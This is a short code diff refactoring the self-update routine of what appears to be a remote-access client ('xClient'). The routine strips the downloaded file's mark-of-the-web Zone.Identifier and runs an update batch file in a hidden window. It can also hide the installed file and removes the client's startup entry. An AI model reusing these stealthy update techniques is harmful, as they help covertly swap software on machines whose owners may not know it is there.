@@ -11,24 +11,24 @@ namespace xClient.Core.Installation
 {
     public static class ClientUpdater
     {
-        public static void Update(Client c, string newFilePath)
+        public static void Update(Client client, string newFilePath)
         {
             try
             {
                 FileHelper.DeleteZoneIdentifier(newFilePath);
 
                 var bytes = File.ReadAllBytes(newFilePath);
-                if (bytes[0] != 'M' && bytes[1] != 'Z')
+                if (!FileHelper.IsValidExecuteableFile(bytes))
                     throw new Exception("no pe file");
 
                 string batchFile = FileHelper.CreateUpdateBatch(newFilePath, Settings.INSTALL && Settings.HIDEFILE);
 
-                if (string.IsNullOrEmpty(batchFile)) throw new Exception("Could not create update batch file.");
+                if (string.IsNullOrEmpty(batchFile))
+                    throw new Exception("Could not create update batch file.");
 
                 ProcessStartInfo startInfo = new ProcessStartInfo
                 {
                     WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true,
                     UseShellExecute = true,
                     FileName = batchFile
                 };
@@ -37,12 +37,12 @@ namespace xClient.Core.Installation
                 ClientData.Disconnect = true;
                 if (Settings.INSTALL && Settings.STARTUP)
                     Startup.RemoveFromStartup();
-                c.Disconnect();
+                client.Disconnect();
             }
             catch (Exception ex)
             {
                 NativeMethods.DeleteFile(newFilePath);
-                new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(c);
+                new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
             }
         }
     }
